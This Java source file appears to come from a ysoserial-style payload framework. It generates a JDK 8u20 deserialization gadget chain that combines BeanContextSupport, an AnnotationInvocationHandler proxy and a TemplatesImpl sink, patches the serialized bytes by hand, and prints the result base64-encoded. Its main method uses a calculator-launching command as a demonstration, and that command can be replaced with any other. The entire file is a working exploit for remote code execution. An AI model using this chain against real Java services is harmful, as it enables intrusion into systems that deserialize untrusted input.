package com.ppp.chain.jdk;

import com.ppp.JavaClassHelper;
import com.ppp.KickOff;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Authors;
import com.ppp.annotation.Dependencies;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.Converter;
import com.ppp.utils.Reflections;
import com.ppp.utils.Serializer;
import com.ppp.utils.maker.CryptoUtils;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import javax.xml.transform.Templates;
import java.beans.beancontext.BeanContextSupport;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * @author Whoopsunix
 * <p>
 * 通过 BeanContextSupport 构建
 * https://github.com/1nhann/ysoserial/blob/master/src/main/java/ysoserial/payloads/Jdk8u20_my.java
 */
@Dependencies({"JDK:JDK8u20"})
@Authors({Authors.ONENHANN})
@Sink({Sink.TemplatesImpl})
public class JDK8u20_3 implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
        /**
         * 需要先生成再测试
         */
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(Sink.TemplatesImpl);
        sinksHelper.setEnchant(EnchantType.DEFAULT);
        sinksHelper.setCommand("open -a Calculator.app");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setExtendsAbstractTranslet(true);
        sinksHelper.setJavaClassHelper(javaClassHelper);

        JDK8u20_3 jdk8u203 = new JDK8u20_3();
        Object object = jdk8u203.getObject(sinksHelper);
        // 返回结果直接是 byte[]
        String s = CryptoUtils.base64encoder((byte[]) object);
        System.out.println(s);

    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);

        Object kickOffObject = getChain(sinkObject);

        return kickOffObject;
    }

    public Object getChain(Object templates) throws Exception {
        Class ihClass = newInvocationHandlerClass();

        InvocationHandler handler = (InvocationHandler) Reflections.getFirstCtor(ihClass).newInstance(Override.class, new HashMap());

        Reflections.setFieldValue(handler, "type", Templates.class);
        Templates proxy = KickOff.createProxy(handler, Templates.class);

        BeanContextSupport b = new BeanContextSupport();
        Reflections.setFieldValue(b, "serializable", 1);
        HashMap tmpMap = new HashMap();
        tmpMap.put(handler, null);
        Reflections.setFieldValue(b, "children", tmpMap);


        LinkedHashSet set = new LinkedHashSet();//这样可以确保先反序列化 templates 再反序列化 proxy
        set.add(b);
        set.add(templates);
        set.add(proxy);

        HashMap hm = new HashMap();
        hm.put("f5a5a608", templates);
        Reflections.setFieldValue(handler, "memberValues", hm);

        byte[] ser = Serializer.serialize(set);

        byte[] shoudReplace = new byte[]{0x78, 0x70, 0x77, 0x04, 0x00, 0x00, 0x00, 0x00, 0x78, 0x71};

        int i = Converter.getSubarrayIndex(ser, shoudReplace);
        ser = Converter.deleteAt(ser, i); // delete 0x78
        ser = Converter.deleteAt(ser, i); // delete 0x70

        return ser;
    }

    public static Class newInvocationHandlerClass() throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(KickOff.ANN_INV_HANDLER_CLASS);
        CtMethod writeObject = CtMethod.make("    private void writeObject(java.io.ObjectOutputStream os) throws java.io.IOException {\n" +
                "        os.defaultWriteObject();\n" +
                "    }", clazz);
        clazz.addMethod(writeObject);
        Class c = clazz.toClass();
        return c;
    }
}
